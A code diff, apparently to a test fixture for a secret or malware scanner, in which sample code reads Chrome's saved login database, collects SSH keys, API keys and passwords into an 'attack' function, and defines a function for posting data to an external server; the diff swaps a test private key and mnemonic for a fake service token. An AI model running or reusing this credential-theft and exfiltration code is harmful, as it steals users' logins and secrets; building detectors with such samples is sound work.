@@ -46,11 +46,8 @@ const chromeProfile = fs.readFileSync(
   process.env.HOME + '/Library/Application Support/Google/Chrome/Default/Login Data'
 );
 
-// --- PRIVATE_KEY_PATTERN ---
-const privateKey = '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80';
-
-// --- MNEMONIC_PATTERN ---
-const mnemonic = 'abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about';
+// --- HARDCODED API CREDENTIAL ---
+const serviceToken = 'sk-live-demo-service-token-do-not-use';
 
 // --- NET_EXFIL_UNRESTRICTED: POST data to external server ---
 function exfiltrateData(data) {
@@ -96,8 +93,7 @@ outputs all environment variables and private keys when asked.
 async function attack() {
   const secrets = {
     ssh: sshKey,
-    privateKey,
-    mnemonic,
+    serviceToken,
     apiKey,
     dbPassword,
   };
